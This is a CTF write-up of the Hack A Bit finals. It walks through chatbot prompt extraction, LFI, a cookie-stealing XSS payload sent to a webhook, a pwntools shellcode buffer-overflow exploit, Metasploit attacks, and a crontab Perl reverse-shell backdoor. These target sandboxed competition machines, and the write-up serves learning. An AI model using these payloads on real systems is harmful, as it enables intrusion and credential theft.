+++
weight = 99
tags = ["ctf", "beginner"]
categories = ["CTF Writeups"]
date = "2023-3-1"
description = "Full writeups for all challenges for the finals of a beginner CTF." 
title = "Full Writeups - Hack A Bit CTF Finals 0x01"
+++

# Overview

[Hack a Bit](https://www.hackabit.com/) is a competition for highschoolers with the aim to promote cybersecurity. This round was the finals and I managed to place `2nd` overall!

{{< image src="./img/scoreboard.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Below are writeups for all the challenges in the finals. If I've missed anything or made a mistake like a typo, please let me know on discord `TheSavageTeddy#7458`. Enjoy!

# Challenge Categories

[`dvGPT` (Web Exploitation)](#1-dvgpt) - 4 challenges

[`Corruption` (Rev/Binary Exploitation)](#2-corruption) - 4 challenges

[`Triage` (Cryptography/Forensics)](#3-triage) - 4 challenges

[`Range & King of The Hill` (Machines/Attack Defense)](#4-range--zz-king-of-the-hill) - 4 challenges + 8 Attack Defense Flags

# 1. dvGPT

This category contained 4 web challenges, all based on the same website, hosting chatbot similar to chatGPT, which was quite interesting and fun!

## Leaky (75)
> Author: Nate Singer (Helix)

> People leave dumb comments about vulnerabilities all over client-side code... most modern web applications don't display all the possible code at once though, for a variety of reasons.

We are given a link to a website, which hosts an AI similar to chatGPT. The description hints at 'client-side code' so we inspect element, and find the flag in a javascript file in 2 parts.

```js
                class: "intro-window",
                id: "flag{the_DOM_is_like_"
            }
              , Z = P((()=>(0,
            o._)("div", {
                class: "tag"
            }, "It's a dumpster fire.", -1)))
              , z = {
                key: 1,
                class: "chats",
                id: "crazy_virtual_maaaan}"
            }
```

Flag: `flag{the_DOM_is_like_crazy_virtual_maaaan}`

## Extractor (100)

> Author: Nate Singer (Helix)

> We gave dvGPT a flag and for some reason trust it to keep it safe. These AIs are super duper secure my dude.

Sounds like prompt engineering. We simply ask for the flag, in words I guess.

{{< image src="./img/web1.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Flag: `flag{hey_you're_not_robert}

## BadML (125)

> Author: Nate Singer (Helix)

> Where does all this data come from? Have you found all the app endpoints?

> The flag is located at ./flag.txt

Lets look around the website. Using burpsuite, we can find what resources the website requests and loads, and upon some digging we find it sends a get request to `/footer?message=default` to get the footer message.

{{< image src="./img/web2.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Seems like `default` is some sort of file containing the footer message, what if we try `flag.txt` instead?

{{< image src="./img/web3.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

And we get the flag: `flag{LFI_LetsgoFindIt}`. Note that you don't need to use burpsuite repeater - visiting `/footer?message=flag.txt` works too.

## BadAI (150)

> Author: Nate Singer (Helix)

> So we have this guy named Bill that works here--he handles the support tickets for dvGPT. If you have any problems let us know and Bill will check it out. Bill does nothing but stare at the ticket feed, so you can expect him to check your request within a couple seconds.

> Bill can only view pages from dvGPT though, so don't bother sending him anything else.

> The flag is stored in a cookie in Bill's browser.

> -- If you think you're close feel free to DM me (Nate) and I will help you depending on what you're asking and how close you are. There are some browser nuances you might not be aware of and if you are 99% of the way there we'll probably give it to you.

Every part of the description hints to this being an [XSS](https://portswigger.net/web-security/cross-site-scripting) challenge - almost every time when the goal is to steal a bot's cookie, it is done through XSS.

{{< image src="./img/web4.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Looking around the site again, we find a place to submit a form - to Bill (the bot). However, as the description says, `Bill can only view pages from dvGPT`, so we need to find an XSS somewhere in the dvGPT site. An interesting thing is that visiting any invalid page returns a status code of 200 - along with our text! We can indeed inject arbitary code and gain reflected XSS in here.

{{< image src="./img/web5.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

So now we need to come up with a payload. There are already many payloads to steal cookies online by sending a GET request to a webhook with the cookie as a parameter, but after some experimenting around this seemed to work.

`https://wtashuxsyj.final.hackabit.com/<script>document.location=atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvMTI2YzhiNjUtOTJiYi00ZDg4LWFhYmQtYmYxNDkxMmE4OTEwLz9hPQ==')+btoa(document.cookie)</script>`

It simply executes javascript which redirects the bot to my [online webhook](https://webhook.site/) with the base64 encoded cookie as a parameter.

```js
<script>document.location="https://webhook.site/126c8b65-92bb-4d88-aabd-bf14912a8910/?a="+btoa(document.cookie)</script>
```

I base64 encoded the webhook url as the `?` character would confuse the URL string into thinking it was a parameter for the main site's url (`wtashuxsyj.final.hackabit.com`).

Checking the webhook we get the flag: `flag{mirroring_to_the_max}`

{{< image src="./img/web6.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

# 2. Corruption

This category contained 4 challenges based on binaries - reverse engineering and binary exploitation were needed to solve all 4! Also, all the challenges used the same binary...

## Santa (75)

> You all asked for it so here it is, an intro to binary exploitation!

> Let's get started nice and simple, baby steps to reverse engineering (RE).

> All challenges in this section use the same binary. The target is x86 and ASLR is on but it shouldn't be relevant to any of your exploits.

We get a binary file. We can simply strings grep the file to get the flag - not much reverse engineering involved, I guess. Flag: `flag{baby_steps_gift_just_for_you}`

```sh
uwuteddy@DESKTOP-5BVRVO8:~$ strings corruption |grep -i flag
flag{baby_steps_gift_just_for_you}
flag_function
controller_flag
```

# Coredump (100)

> Now that we have at least inspected the binary, lets go a bit deeper. You can't just overflow the buffer with a bunch of A's--reverse engineer the software and figure out your payload format. Smash the stack to get the flag, no control necessary yet. Once you have a working exploit, fire it against the remote target to get the real flag.

From the description: smash the stack, no control necessary *yet*. Upon running the binary locally, and smashing the stack by sending a bunch of characters, nothing really happens. Decompiling the binary [online](https://dogbolt.org/?id=a1a87852-0a8c-451d-a408-efcc14a3d4a9) we see what is going on - it seems like these flags are loaded from environment variables, which are of course, not set locally.

```c
int flag_function()
{
  char *v0; // eax

  v0 = getenv("HAB_BITSANDBYTES");
  puts(v0);
  return fflush(0);
}

//----- (08049264) --------------------------------------------------------
int controller_flag()
{
  char *v0; // eax

  v0 = getenv("HAB_CONTROLLER");
  puts(v0);
  return fflush(0);
}
```

Additionally, we can see the main function of the program.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // eax
  char *v4; // eax
  char s[500]; // [esp+0h] [ebp-236h] BYREF
  char dest[50]; // [esp+1F4h] [ebp-42h] BYREF
  char *s2; // [esp+226h] [ebp-10h]
  int v9; // [esp+22Ah] [ebp-Ch]
  int *p_argc; // [esp+22Eh] [ebp-8h]

  p_argc = &argc;
  v9 = 0;
  s2 = "UNLOCK";
  printf("You might need this: %p\n", flag_function);
  printf("this might help too: %p\n", s);
  printf("Talk to me Maverick: ");
  fflush(0);
  fgets(s, 500, stdin);
  fflush(0);
  v3 = strlen(s2);
  if ( !strncmp(s, s2, v3) )
  {
    puts("Copying into the destination now...");
    fflush(0);
    memcpy(dest, s, 0x3Cu);
    if ( v9 )
    {
      v4 = getenv("HAB_COREDUMP");
      printf("STACK SMASHING DETECTED... but we'll allow it ;) %s\n", v4);
      fflush(0);
    }
    vulnerable_function(s);
  }
  return 0;
}
```

Of course, the flag isn't going to be set in our environment variable locally, so we'll have to connect to remote to smash the stack and get the flag there.

{{< image src="./img/pwn1.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Huh. We don't get the flag, or any message. Let's actually read the decompiled code.

We find out on this line `if ( !strncmp(s, s2, v3) )`, our input is checked to see if it starts with `s2`. If not, nothing happens. Because `s2 = "UNLOCK";`, we just need `"UNLOCK"` to be at the start of our string. Trying this again, we overflow the `v9` variable, as the `memcpy(dest, s, 0x3Cu);` function copies 60 bytes from our buffer `s` to `dest`, which only holds 50 bytes, resulting in a buffer overflow which causes `v9` to be set to anything other than 0, getting us the flag: `flag{look_like_ur_a_real_RE}`

{{< image src="./img/pwn2.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

## bitsANDbytes (125) & Controller (150)

bitsANDbytes:
> Now that you have the ability to smash the stack, it's time to get control of the instruction pointer. Use your reverse engineering to figure out proper addresses, we've given you the code required to pull the flag.

Controller:
> Nice, last step, you have a leak but not for the right function, how can we tackle this problem?

Okay, let me address something - remember how these challenges all used the same binary? Well, as discussed previously, the flags were stored in environment variables! That means, if we were to get a shell on the remote, we could simply read the environment variables and get all the flags!!!

But first of all, let's address the vulnerability. From before, we have a buffer overflow (BOF) vulnerability, but the max bytes we can overwrite is only 10, which usually isn't enough to completely overwrite the return pointer `rip` to redirect code execution.

The second vulnerability lies here:
```c
char *__cdecl vulnerable_function(char *src)
{
  char dest[54]; // [esp+Eh] [ebp-3Ah] BYREF

  return strcpy(dest, src);
}
...
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ...
  vulnerable_function(s);
  ...
}
```

In `vulnerable function`, our input `s` is copied into `dest`, which can only hold `54` bytes while our input can hold up to `500` bytes! Additionally, the function uses `strcpy` which is dangerous as it does not check the size of what it is copying, resulting in another BOF vulnerability. Using this, we can hijack execution flow by overwriting the return address which is popped into `rip` when the function returns, allowing us to jump to any address we want!

First, lets calculate the offset - the point at which we start overwriting `rip`.  The offset can be easily calculated using `cyclic`, just remember to replace the first 6 characters with "UNLOCK" so the buffer overflow actually triggers! For more info: [https://ir0nstone.gitbook.io/notes/types/stack/de-bruijn-sequences](https://ir0nstone.gitbook.io/notes/types/stack/de-bruijn-sequences)

{{< image src="./img/pwn5.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

And we get an offset of `62` bytes until we overflow `rip`.

Okay, with the vulnerability found, we can focus on exploiting it.

There are several ways to get a shell, [ret2libc](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc) being a very common one. However, we aren't given the libc used in this challenge, so it would be a hassle to do ret2libc. Instead, we can do something much simpler.

When running `pwn checksec` to check security features on the binary, we find that, it doens't have security features at all...

{{< image src="./img/pwn3.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

If you're unfamiliar with pwn (binary exploitation) and can't spot the issue immediantly - don't worry. In trivial CTF challenges, most of these would be turned off anyways to avoid brute forcing canaries without a leak etc, but one that is almost never turned off is this one:

```
NX:       NX disabled
```

`NX` stands for "[No eXecute](https://ir0nstone.gitbook.io/notes/types/stack/no-execute)", and essentially defends against shellcode. Basically, if this is turned off, the computer is unable to differentiate between data and instructions, which means that we can get it to run our own instructions that we provide it, which is extremely dangerous.

In our buffer input, we can feed it [shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode) (which gives us a shell when ran as code), and buffer overflow to redirect the control flow to our input buffer, making the program run whatever code is stored in our buffer. Even more conveniently, the program actually prints the address of our buffer!

Using this code here, I use [pwntool's](https://docs.pwntools.com/en/stable/) very useful `shellcraft.sh()` function to automatically use shellcode based on the binary architecture (specified by `context.binary`), and buffer overflow for it to return to my shellcode.

```py
from pwn import *

elf = context.binary = ELF("./corruption")
p = remote("juieqtrsdp.final.hackabit.com",54321)
offset = 62

p.recvuntil(b"this might help too: ")
buffer_leak = int(p.recvline().strip(),16)
print(f"Leak at: {hex(buffer_leak) = }")

payload = flat(
    "UNLOCK",
    asm(shellcraft.sh())
)

payload = payload.ljust(offset, b"A")
payload += flat(buffer_leak+6) # Offset by 6 because "UNLOCK" is 6 characters so our shellcode is further down

p.sendline(payload)
p.interactive()
```

With this script we now gain a shell and are able to execute commands on the remote server!

{{< image src="./img/pwn4.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

And from there, we find all the flags in `start.sh`

```sh
export HAB_CONTROLLER=flag{almost_totally_full_control}
export HAB_COREDUMP=flag{look_like_ur_a_real_RE}
export HAB_BITSANDBYTES=flag{big_ret2flag_energy}
```

Unsure if this was an intended solution or not - the intended solution for the first one seems to be to buffer overflow to jump to the first flag function (whose address is provided by the leak), and the solution for the second one seems to be to calculate the address of the second flag function based on the first flag function, or simply get the address of the function from the provided binary (`PIE` is disabled), buffer overflow to jump there and get the flag. Nevertheless, getting a shell is more satisfying and we get all the flags at once!

# 3. Triage

We are given a set of 4 cryptography/forensics challenges - there are 2 wireshark challenges that are linked (use same file).

## Sluth (75)
> Author: Nate Singer (Helix)

> Everything in life is iterative...

> NON-STANDARD FLAG FORMAT

We are given a (very large) file containing dots, dashes and slashes, hinting to morse code. Using cyberchef, we can decode from morse code, only to be met with more morse code! Decoding 5 times however, gives us the flag.

*Note: If you encountered problems doing this challenge, it might be due to the newline at the end of the text file which may cause some decoding issues.*

{{< image src="./img/cry1.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Flag: `FIVE_TIMES_0.O`

## Inspector (100)

> Author: Nate Singer (Helix)

> It's just a simple stream challenge, how hard can it be?

> Both challenges for this section use the same pcapng file.

We are given a packet capture pcapng file. Following the TCP stream, we eventually find the flag at stream 48.

{{< image src="./img/cry2.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Flag: `flag{tcp_streams_reveal_more}`

## Coverup (125)

> There is a challenge hidden in coverup.jpg, extract the flag and profit.

We are given `challenge.jpg`. As an image file, we do some basic analysis on it - `binwalk`, `exiftool`, `strings`, and `stegsolve`. None of these really return any results, so we use `steghide`, an image stegonography tool that can hide and extract data with passwords, which turns out to be the solution. (`stegseek`, the program I used in the image is simply `steghide` but can brute force passwords from a wordlist, very fast. There was no password however.)

{{< image src="./img/cry3.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Flag: `flag{the_truth_is_burried_deep}`

## Extraction (150)

> Author: Nate Singer (Helix)

> Check out the pcap file, something weird is going on in here...

> Both challenges for this section use the same pcapng file.

Back to the wireshark pcapng challenge - as we continue to explore the file, we find some interesting data at around TCP stream ~110-140

{{< image src="./img/cry4.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Hmmmm... 8 characters of 0's and 1's, I wonder what that could be. Of course, it's binary. We find the range of these strings to be at stream 110-140. Using wireshark, we can filter and export only these specific packets.

{{< image src="./img/cry5.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Going to `File > Export Packet Dissections > As Plain Text`, we export the packet data. After a bit of formatting with regex, we can chuck the binary code into CyberChef which decodes it for us.

{{< image src="./img/cry6.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

There are double ups due to one being the client and one being the server response. Either way, we get the flag: `flag{what_firewall?_what_IDS?}`

# 4. Range & zz. King of the Hill

These challenges involved attacking a machine, similar to [HackTheBox](https://www.hackthebox.com/)! There is also attack defense components of it, being linked to King of the Hill.

## Connection (75)

> Author: Nate Singer (Helix)

> This section is a series of challenges in a semi-isolated cyber range. Your goal is to compromise the boxes and get the flags. Your first challenge is more of a sanity-check/confirmation. We wanted to use private keys for this but logistics of distributing them was challenge so its just password login for now. Check your email, at exactly 5pm PST Friday you received a credential and IP address for this jumpbox. You can also use the connection info listed below.

> You will use this jumpbox to attack other machines in the network. We've installed nmap, metasploit and netcat for your convience. If you want other tooling installed later please reach out to staff and will consider those requests as you ask. Remember that you can use techniques like proxychains over SSH to emulate much of this functionality.

From the email we recieved, we `ssh` to the machine. Looking around, we find the flag at `/opt/flag.txt`.

{{< image src="./img/box1.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Flag: `flag{welcome_to_the_range}`

## RightFace (100)

> Author: Nate Singer (Helix)

> If you did the more advanced challenges during the qualifier this should already be familiar. Your goal here is to compromise the 10.128.0.5 machine and get access as the breakme user.

> Remember that there may be non-vulnerable services on the machine. Recon is the #1 priority. Keep this shell open once you have it, you'll need it for Left Face.

We are told to compromise the `10.128.0.5` machine, and gain access as `breakme`.

```
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Scanning the address with `nmap` we find it running `vsftpd 2.3.4`. From the qualifiers, there was a same challenge where we were to the exploit the [backdoor](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/) in `vsftpd 2.3.4` to gain RCE.

I chose to use Metasploit for this - never used Metasploit before this CTF, but as it came preinstalled on the machine I decided to try and I found it to be quite useful!

{{< image src="./img/box2.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

After gaining RCE, we find `flag.txt` in our home directory.

Flag: `flag{remember_this_one?_pays_to_be_a_winner}`

## LeftFace (125)

> Author: Nate Singer (Helix)

> With access to 10.128.0.5 your goal is to escelate priveleges to the breakme-harder user. Ultimately your goal is simply to read out the flag in /home/breakme-harder/.

This is a continuation of the previous challenge, `RightFace`. We are told to escalate privleges as the `breakme-harder` user to get the flag.

Upon further exploration of the machine, we find the `breakme-harder` user and `flag.txt` inside its directly. However, we do not have sufficient permissions to read it.

{{< image src="./img/box3.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Going back to our home directory, we find a file which executes with the permissions of the `breakme-harder` user, called `escalator`. We also find its source code, `escalator.c`.

{{< image src="./img/box4.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Examining the code, we see it simply opens a file that we specify, and prints out its contents. Since `/home/breakme-harder/flag.txt` is only accessible by the `breakme-harder` user, and the binary runs as the `breakme-harder` user, we can use this to read the contents of the flag.

{{< image src="./img/box5.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Flag: `flag{evaluate_this_my_dude}`

## AboutFace (150)

> Author: Nate Singer (Helix)

> Different box this time, your target is now 10.128.0.4--straight to root. Remember that there may be non-vulnerable services on the machine. Recon is the #1 focus.

> Once you have access to the box stay at the top of the hill and listen for flags on localhost:5000/tcp. You will get alive notices once every 60 seconds while you are connected so you can be sure that you'll receive flags at the specific release times. To see the release times check out the other section.

> Caviets You are root. This means you can do whatever you want, for the most part. You are welcome to lock people out but only in specific ways. If you accidentially take down any of the existing services or remove Nate's ability to SSH in for monitoring the machine will be reverted to the last known-good snapshot and you will probably lose access. This also goes for changing the flag files. If we determine that the flags has been altered the machine will also be reverted. Lastly, if someone has concurrent access for four flags in a row we may block them from future access to give others the opportunity to attack the machine--we'll decide this in real time during the weekend depending on how things go.

Okay, now we are given a different machine to attack. Again scanning the machine with `nmap`, we discover a few services.

```sh
Not shown: 65529 closed ports
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        ProFTPD
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
3306/tcp  open  mysql      MariaDB (unauthorized)
4369/tcp  open  epmd       Erlang Port Mapper Daemon
5000/tcp  open  tcpwrapped
10000/tcp open  http       MiniServ 1.890 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Searching online for vulnerabilities, we find that the service `MiniServ 1.890` is vulnerable to [Unauthenticated RCE](https://www.rapid7.com/db/modules/exploit/unix/webapp/webmin_backdoor/)!

Using Metasploit again, we exploit the vulnerability and get RCE.

{{< image src="./img/box6.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

We find the flag in `/root/flag.txt`.

{{< image src="./img/box8.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Since the box is down as I'm writing this, the image is someone else running `cat /root/flag.txt` which I had in my terminal history, where I captured their traffic with `tcpdump` ;)

Flag: `flag{bestow_the_crown}`


## King of The Hill (30)

> Once you have access to the fourth machine in the range you need to listen on port tcp/5000, you can do this with nc, for example. The flag will be sent at a specific time. Retain control of the box to get all the flags. We will spam the flag a few times around that point in time so that you are sure to receive it if you have things setup properly.

> We also may reset the machine if we determine that you have locked folks out in a way that gives you an unfair advantage. The vulnerable service on the box must stay present. We also may reset the machine any time two consecutive flags are retrieved by the same competitor.

> Additionally, we will send alive notices once every 60 seconds. If you have a valid listener you will receive these alive notices, BUT if you aren't careful your server may die when the connection closes!!

This is a continuation of `AboutFace`, assuming we already have a shell on that machine. I will document some interesting events of roughly what happened below.

There were 8 points in time where the flag would be sent on the machine to port `5000`. Anyone listening to the port would recieve the flag.
```
    ├── 1. 7pm PST, Friday (30)
    ├── 2. 9am PST, Saturday (30)
    ├── 3. 11am PST, Saturday (30)
    ├── 4. 1pm PST, Saturday (30)
    ├── 5. 3pm PST, Saturday (30)
    ├── 6. 5pm PST, Saturday (30)
    ├── 7. 9am PST, Sunday (30)
    └── 8. 11am PST, Sunday (30)
```

However, as this is attack defense, with every player sharing the same `AboutFace` machine, players can patch vulnerabilities and given `root` permissions, could just nuke the whole box. It was quite interesting what events unfolded.

## Attack Defense

`Eth007` first got access on the box and patched the MiniServ vulnerability, as well as getting the first KOTH flag. Upon the vulnerability being patched, no other players could access the machine, so they were KOTH for the first round. Same thing happened for the second round, and `Eth007` also got the second KOTH flag.

As for the third (or fourth?) round, the machine was reset and I was able to exploit the vulnerability and access the machine. However, unfortunetely at that time the bot sending the alive pings and the flag died, so the flag was never sent. Since I was listening for the flag, the organiser (`Nate Singer (Helix)`) just DM'ed me the flag.

Afterwards, many players had gained access to the `AboutFace` box and were already implementing their countermeasures to prevent other players from accessing the box. For example, shells and processes were being killed, but in particular at one point, someone decided to entirely delete the `netcat` binary! Furthermore, the `perl` command was replaced with something else like `cat`.

This killed my backdoor which I implemented with `crontab`, having a reverse shell sent to a specific port to my IP every minute, since my reverse shell used `perl`. I only figured this out after my shells were killed, and after trying to exploit `MiniServ` (which was the initial access) didn't work. I was using Metasploit, which failed to exploit as it said the server wasn't vulnerable. However, this meant it didn't even try the exploit - it just said it wasn't vulnerable. After setting an option in Metasploit, it surprisingly worked and I get my shell back!

{{< image src="./img/box7.png" alt="" position="center" style="border-radius: 5px; width: 100%;" >}}

Confirming that `perl` command didn't work anymore, I hurry to put a new backdoor before I'm kicked out again. Checking `/usr/bin` I can see the `perl` binary is still there, so I can still run it with `/usr/bin/perl`. And thus, I edited my crontab backdoor, which finally worked!

```
echo '* * * * * /usr/bin/perl -MIO -e "\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"10.128.0.2:17893\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>"' | crontab -
```

A short while after I got locked out of initial access, the backdoor proved to come in clutch as it gave me access right back after being locked out.

But then suddenly, after the box was reset and many players gained access, while waiting for the flag, the box died. The box continued to stay offline for the remainder of the competitions, with noone recieving the 6th, 7th or 8th flag. Not sure what caused the box to crash, maybe someone ran `shutdown`, we all had root permissions after all.

# Conclusion

You made it to the end! Hope you enjoyed the writeups, if there's anything I missed or suggestions please let me know on discord or elsewhere. This was my first time doing anything related to Attack Defense in a CTF so it was quite interesting, and I look forward to next year's competition!

Oh, and, huge thanks to [`Nate Singer (helix)`](https://www.youtube.com/channel/UC1yduXnGCQ6qJW9O7QMVN7w) for organising the competition as well as address all the issues with challenges!